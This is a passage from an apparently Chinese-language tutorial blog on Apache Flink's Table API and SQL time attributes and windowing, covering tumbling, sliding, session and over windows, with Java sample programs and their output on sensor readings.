SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;SensorReading&gt;(Time.seconds(<span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(SensorReading element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 将流转换成表，定义时间特性</span></span><br><span class="line">    <span class="comment">//        Table dataTable = tableEnv.fromDataStream(dataStream, &quot;id, timestamp as ts, temperature as temp, pt.proctime&quot;);</span></span><br><span class="line">    Table dataTable = tableEnv.fromDataStream(dataStream, <span class="string">&quot;id, timestamp as ts, temperature as temp, rt.rowtime&quot;</span>);</span><br><span class="line"></span><br><span class="line">    dataTable.printSchema();</span><br><span class="line"></span><br><span class="line">    tableEnv.toAppendStream(dataTable,Row.class).print();</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下：</p><p><em>注：这里最后一列rt里显示的是EventTime，而不是Processing Time</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line"> |-- id: STRING</span><br><span class="line"> |-- ts: BIGINT</span><br><span class="line"> |-- temp: DOUBLE</span><br><span class="line"> |-- rt: TIMESTAMP(3) *ROWTIME*</span><br><span class="line"></span><br><span class="line">sensor_1,1547718199,35.8,2019-01-17T09:43:19</span><br><span class="line">sensor_6,1547718201,15.4,2019-01-17T09:43:21</span><br><span class="line">sensor_7,1547718202,6.7,2019-01-17T09:43:22</span><br><span class="line">sensor_10,1547718205,38.1,2019-01-17T09:43:25</span><br><span class="line">sensor_1,1547718207,36.3,2019-01-17T09:43:27</span><br><span class="line">sensor_1,1547718209,32.8,2019-01-17T09:43:29</span><br><span class="line">sensor_1,1547718212,37.1,2019-01-17T09:43:32</span><br></pre></td></tr></table></figure><h4 id="窗口"><a href="#窗口" class="headerlink" title="窗口"></a>窗口</h4><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106482095">Flink-分组窗口 | Over Windows | SQL 中的 Group Windows | SQL 中的 Over Windows</a></p></blockquote><ul><li>时间语义，要配合窗口操作才能发挥作用。</li><li>在Table API和SQL中，主要有两种窗口 <ul><li>Group Windows（分组窗口） <ul><li><strong>根据时间戳或行计数间隔，将行聚合到有限的组（Group）中，并对每个组的数据执行一次聚合函数</strong></li></ul></li><li>Over Windows <ul><li>针对每个输入行，计算相邻行范围内的聚合</li></ul></li></ul></li></ul><h5 id="Group-Windows"><a href="#Group-Windows" class="headerlink" title="Group Windows"></a>Group Windows</h5><ul><li><p> Group Windows 是使用 window（w:GroupWindow）子句定义的，并且<strong>必须由as子句指定一个别名</strong>。 </p></li><li><p> 为了按窗口对表进行分组，窗口的别名必须在 group by 子句中，像常规的分组字段一样引用  </p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Table</span> table = input</span><br><span class="line">.window([w:<span class="type">GroupWindow</span>] as <span class="string">&quot;w&quot;</span>) <span class="comment">// 定义窗口，别名为w</span></span><br><span class="line">.groupBy(<span class="string">&quot;w, a&quot;</span>) <span class="comment">// 按照字段 a和窗口 w分组</span></span><br><span class="line">.select(<span class="string">&quot;a,b.sum&quot;</span>); <span class="comment">// 聚合</span></span><br></pre></td></tr></table></figure></li><li><p> Table API 提供了一组具有特定语义的预定义 Window 类，这些类会被转换为底层 DataStream 或 DataSet 的窗口操作 </p></li><li><p>分组窗口分为三种： </p><ul><li>滚动窗口</li><li>滑动窗口</li><li>会话窗口</li></ul></li></ul><h6 id="滚动窗口-Tumbling-windows"><a href="#滚动窗口-Tumbling-windows" class="headerlink" title="滚动窗口(Tumbling windows)"></a>滚动窗口(Tumbling windows)</h6><ul><li>滚动窗口（Tumbling windows）要用Tumble类来定义</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Tumbling Event-time Window（事件时间字段rowtime）</span></span><br><span class="line">.window(Tumble.over(<span class="string">&quot;10.minutes&quot;</span>).on(<span class="string">&quot;rowtime&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Tumbling Processing-time Window（处理时间字段proctime）</span></span><br><span class="line">.window(Tumble.over(<span class="string">&quot;10.minutes&quot;</span>).on(<span class="string">&quot;proctime&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Tumbling Row-count Window (类似于计数窗口，按处理时间排序，10行一组)</span></span><br><span class="line">.window(Tumble.over(<span class="string">&quot;10.rows&quot;</span>).on(<span class="string">&quot;proctime&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br></pre></td></tr></table></figure><ul><li>over：定义窗口长度</li><li>on：用来分组（按时间间隔）或者排序（按行数）的时间字段</li><li>as：别名，必须出现在后面的groupBy中</li></ul><h6 id="滑动窗口-Sliding-windows"><a href="#滑动窗口-Sliding-windows" class="headerlink" title="滑动窗口(Sliding windows)"></a>滑动窗口(Sliding windows)</h6><ul><li>滑动窗口（Sliding windows）要用Slide类来定义</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Sliding Event-time Window</span></span><br><span class="line">.window(Slide.over(<span class="string">&quot;10.minutes&quot;</span>).every(<span class="string">&quot;5.minutes&quot;</span>).on(<span class="string">&quot;rowtime&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sliding Processing-time window </span></span><br><span class="line">.window(Slide.over(<span class="string">&quot;10.minutes&quot;</span>).every(<span class="string">&quot;5.minutes&quot;</span>).on(<span class="string">&quot;proctime&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sliding Row-count window</span></span><br><span class="line">.window(Slide.over(<span class="string">&quot;10.rows&quot;</span>).every(<span class="string">&quot;5.rows&quot;</span>).on(<span class="string">&quot;proctime&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br></pre></td></tr></table></figure><ul><li>over：定义窗口长度</li><li>every：定义滑动步长</li><li>on：用来分组（按时间间隔）或者排序（按行数）的时间字段</li><li>as：别名，必须出现在后面的groupBy中</li></ul><h6 id="会话窗口-Session-windows"><a href="#会话窗口-Session-windows" class="headerlink" title="会话窗口(Session windows)"></a>会话窗口(Session windows)</h6><ul><li>会话窗口（Session windows）要用Session类来定义</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Session Event-time Window</span></span><br><span class="line">.window(Session.withGap(<span class="string">&quot;10.minutes&quot;</span>).on(<span class="string">&quot;rowtime&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Session Processing-time Window </span></span><br><span class="line">.window(Session.withGap(<span class="string">&quot;10.minutes&quot;</span>).on(<span class="string">&quot;proctime&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br></pre></td></tr></table></figure><ul><li>withGap：会话时间间隔</li><li>on：用来分组（按时间间隔）或者排序（按行数）的时间字段</li><li>as：别名，必须出现在后面的groupBy中</li></ul><h5 id="SQL中的Group-Windows"><a href="#SQL中的Group-Windows" class="headerlink" title="SQL中的Group Windows"></a>SQL中的Group Windows</h5><p>Group Windows定义在SQL查询的Group By子句中</p><ul><li>TUMBLE(time_attr, interval) <ul><li>定义一个滚动窗口，每一个参数是时间字段，第二个参数是窗口长度</li></ul></li><li>HOP(time_attr，interval，interval) <ul><li>定义一个滑动窗口，第一个参数是时间字段，<strong>第二个参数是窗口滑动步长，第三个是窗口长度</strong></li></ul></li><li>SESSION(time_attr，interval) <ul><li>定义一个绘画窗口，第一个参数是时间字段，第二个参数是窗口间隔</li></ul></li></ul><h6 id="测试代码-9"><a href="#测试代码-9" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.TimeCharacteristic;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Over;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Tumble;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/4 12:47 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest5_TimeAndWindow</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 读入文件数据，得到DataStream</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 转换成POJO</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;SensorReading&gt;(Time.seconds(<span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(SensorReading element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 将流转换成表，定义时间特性</span></span><br><span class="line">    <span class="comment">//        Table dataTable = tableEnv.fromDataStream(dataStream, &quot;id, timestamp as ts, temperature as temp, pt.proctime&quot;);</span></span><br><span class="line">    Table dataTable = tableEnv.fromDataStream(dataStream, <span class="string">&quot;id, timestamp as ts, temperature as temp, rt.rowtime&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//        dataTable.printSchema();</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//        tableEnv.toAppendStream(dataTable,Row.class).print();</span></span><br><span class="line"></span><br><span class="line">    tableEnv.createTemporaryView(<span class="string">&quot;sensor&quot;</span>, dataTable);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 窗口操作</span></span><br><span class="line">    <span class="comment">// 5.1 Group Window</span></span><br><span class="line">    <span class="comment">// table API</span></span><br><span class="line">    Table resultTable = dataTable.window(Tumble.over(<span class="string">&quot;10.seconds&quot;</span>).on(<span class="string">&quot;rt&quot;</span>).as(<span class="string">&quot;tw&quot;</span>))</span><br><span class="line">      .groupBy(<span class="string">&quot;id, tw&quot;</span>)</span><br><span class="line">      .select(<span class="string">&quot;id, id.count, temp.avg, tw.end&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SQL</span></span><br><span class="line">    Table resultSqlTable = tableEnv.sqlQuery(<span class="string">&quot;select id, count(id) as cnt, avg(temp) as avgTemp, tumble_end(rt, interval &#x27;10&#x27; second) &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;from sensor group by id, tumble(rt, interval &#x27;10&#x27; second)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    dataTable.printSchema();</span><br><span class="line">    tableEnv.toAppendStream(resultTable, Row.class).print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">    tableEnv.toRetractStream(resultSqlTable, Row.class).print(<span class="string">&quot;sql&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line"> |-- id: STRING</span><br><span class="line"> |-- ts: BIGINT</span><br><span class="line"> |-- temp: DOUBLE</span><br><span class="line"> |-- rt: TIMESTAMP(<span class="number">3</span>) *ROWTIME*</span><br><span class="line"></span><br><span class="line">result&gt; sensor_1,<span class="number">1</span>,<span class="number">35.8</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">20</span></span><br><span class="line">result&gt; sensor_6,<span class="number">1</span>,<span class="number">15.4</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">30</span></span><br><span class="line">result&gt; sensor_1,<span class="number">2</span>,<span class="number">34.55</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">30</span></span><br><span class="line">result&gt; sensor_10,<span class="number">1</span>,<span class="number">38.1</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">30</span></span><br><span class="line">result&gt; sensor_7,<span class="number">1</span>,<span class="number">6.7</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">30</span></span><br><span class="line">sql&gt; (<span class="keyword">true</span>,sensor_1,<span class="number">1</span>,<span class="number">35.8</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">20</span>)</span><br><span class="line">result&gt; sensor_1,<span class="number">1</span>,<span class="number">37.1</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">40</span></span><br><span class="line">sql&gt; (<span class="keyword">true</span>,sensor_6,<span class="number">1</span>,<span class="number">15.4</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">30</span>)</span><br><span class="line">sql&gt; (<span class="keyword">true</span>,sensor_1,<span class="number">2</span>,<span class="number">34.55</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">30</span>)</span><br><span class="line">sql&gt; (<span class="keyword">true</span>,sensor_10,<span class="number">1</span>,<span class="number">38.1</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">30</span>)</span><br><span class="line">sql&gt; (<span class="keyword">true</span>,sensor_7,<span class="number">1</span>,<span class="number">6.7</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">30</span>)</span><br><span class="line">sql&gt; (<span class="keyword">true</span>,sensor_1,<span class="number">1</span>,<span class="number">37.1</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">40</span>)</span><br></pre></td></tr></table></figure><h5 id="Over-Windows"><a href="#Over-Windows" class="headerlink" title="Over Windows"></a>Over Windows</h5><blockquote><p><a href="https://blog.csdn.net/liuyuehui110/article/details/42736667">SQL中over的用法</a></p><p><a href="https://www.cnblogs.com/xiayang/articles/1886372.html">sql over的作用及用法</a></p></blockquote><ul><li><p> <strong>Over window 聚合是标准 SQL 中已有的（over 子句），可以在查询的 SELECT 子句中定义</strong> </p></li><li><p> Over window 聚合，会<strong>针对每个输入行</strong>，计算相邻行范围内的聚合 </p></li><li><p> Over windows 使用 window（w:overwindows*）子句定义，并在 select（）方法中通过<strong>别名</strong>来引用  </p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Table</span> table = input</span><br><span class="line">.window([w: <span class="type">OverWindow</span>] as <span class="string">&quot;w&quot;</span>)</span><br><span class="line">.select(<span class="string">&quot;a, b.sum over w, c.min over w&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p> Table API 提供了 Over 类，来配置 Over 窗口的属性 </p></li></ul><h6 id="无界Over-Windows"><a href="#无界Over-Windows" class="headerlink" title="无界Over Windows"></a>无界Over Windows</h6><ul><li>可以在事件时间或处理时间，以及指定为时间间隔、或行计数的范围内，定义 Over windows</li><li>无界的 over window 是使用常量指定的</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 无界的事件时间over window (时间字段 &quot;rowtime&quot;)</span></span><br><span class="line">.window(Over.partitionBy(<span class="string">&quot;a&quot;</span>).orderBy(<span class="string">&quot;rowtime&quot;</span>).preceding(UNBOUNDED_RANGE).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">//无界的处理时间over window (时间字段&quot;proctime&quot;)</span></span><br><span class="line">.window(Over.partitionBy(<span class="string">&quot;a&quot;</span>).orderBy(<span class="string">&quot;proctime&quot;</span>).preceding(UNBOUNDED_RANGE).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无界的事件时间Row-count over window (时间字段 &quot;rowtime&quot;)</span></span><br><span class="line">.window(Over.partitionBy(<span class="string">&quot;a&quot;</span>).orderBy(<span class="string">&quot;rowtime&quot;</span>).preceding(UNBOUNDED_ROW).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">//无界的处理时间Row-count over window (时间字段 &quot;rowtime&quot;)</span></span><br><span class="line">.window(Over.partitionBy(<span class="string">&quot;a&quot;</span>).orderBy(<span class="string">&quot;proctime&quot;</span>).preceding(UNBOUNDED_ROW).as(<span class="string">&quot;w&quot;</span>))</span><br></pre></td></tr></table></figure><p><em>partitionBy是可选项</em></p><h6 id="有界Over-Windows"><a href="#有界Over-Windows" class="headerlink" title="有界Over Windows"></a>有界Over Windows</h6><ul><li>有界的over window是用间隔的大小指定的</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 有界的事件时间over window (时间字段 &quot;rowtime&quot;，之前1分钟)</span></span><br><span class="line">.window(Over.partitionBy(<span class="string">&quot;a&quot;</span>).orderBy(<span class="string">&quot;rowtime&quot;</span>).preceding(<span class="string">&quot;1.minutes&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 有界的处理时间over window (时间字段 &quot;rowtime&quot;，之前1分钟)</span></span><br><span class="line">.window(Over.partitionBy(<span class="string">&quot;a&quot;</span>).orderBy(<span class="string">&quot;porctime&quot;</span>).preceding(<span class="string">&quot;1.minutes&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 有界的事件时间Row-count over window (时间字段 &quot;rowtime&quot;，之前10行)</span></span><br><span class="line">.window(Over.partitionBy(<span class="string">&quot;a&quot;</span>).orderBy(<span class="string">&quot;rowtime&quot;</span>).preceding(<span class="string">&quot;10.rows&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 有界的处理时间Row-count over window (时间字段 &quot;rowtime&quot;，之前10行)</span></span><br><span class="line">.window(Over.partitionBy(<span class="string">&quot;a&quot;</span>).orderBy(<span class="string">&quot;proctime&quot;</span>).preceding(<span class="string">&quot;10.rows&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br></pre></td></tr></table></figure><h5 id="SQL中的Over-Windows"><a href="#SQL中的Over-Windows" class="headerlink" title="SQL中的Over Windows"></a>SQL中的Over Windows</h5><ul><li>用 Over 做窗口聚合时，所有聚合必须在同一窗口上定义，也就是说必须是相同的分区、排序和范围</li><li>目前仅支持在当前行范围之前的窗口</li><li>ORDER BY 必须在单一的时间属性上指定</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(amount) <span class="keyword">OVER</span> (</span><br><span class="line">  <span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">user</span></span><br><span class="line">  <span class="keyword">ORDER</span> <span class="keyword">BY</span> proctime</span><br><span class="line">  <span class="keyword">ROWS</span> <span class="keyword">BETWEEN</span> <span class="number">2</span> PRECEDING <span class="keyword">AND</span> <span class="keyword">CURRENT</span> <span class="type">ROW</span>)</span><br><span class="line"><span class="keyword">FROM</span> Orders</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 也可以做多个聚合</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(amount) <span class="keyword">OVER</span> w, <span class="built_in">SUM</span>(amount) <span class="keyword">OVER</span> w</span><br><span class="line"><span class="keyword">FROM</span> Orders</span><br><span class="line"><span class="keyword">WINDOW</span> w <span class="keyword">AS</span> (</span><br><span class="line">  <span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">user</span></span><br><span class="line">  <span class="keyword">ORDER</span> <span class="keyword">BY</span> proctime</span><br><span class="line">  <span class="keyword">ROWS</span> <span class="keyword">BETWEEN</span> <span class="number">2</span> PRECEDING <span class="keyword">AND</span> <span class="keyword">CURRENT</span> <span class="type">ROW</span>)</span><br></pre></td></tr></table></figure><h6 id="测试代码-10"><a href="#测试代码-10" class="headerlink" title="测试代码"></a>测试代码</h6><p>java代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.TimeCharacteristic;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Over;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Tumble;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span 